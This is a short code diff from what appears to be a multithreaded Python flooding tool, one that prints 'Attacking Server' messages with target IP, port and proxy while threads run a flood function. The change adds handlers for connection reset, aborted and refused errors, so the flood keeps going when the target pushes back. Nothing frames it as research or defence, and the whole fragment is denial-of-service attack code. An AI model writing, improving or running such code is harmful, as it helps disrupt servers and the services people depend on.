@@ -59,6 +59,14 @@ try:
             print(f"Attacking Server | {ip}:{port} Sent : ", i, f" With Proxy : {fip}", end='\r')
         except TimeoutError:
             print("Timeout  ", end='\r')
+        except ConnectionResetError:
+            print("Reseted  ", end='\r')
+        except ConnectionAbortedError:
+            print("Error    ", end='\r')
+        except ConnectionRefusedError:
+            print("Refused  ", end='\r')
+        except ConnectionError:
+            print("Check Your Connection ", end='\r')
     for i in range(thd):
         t = threading.Thread(target=floods)
         t.start()
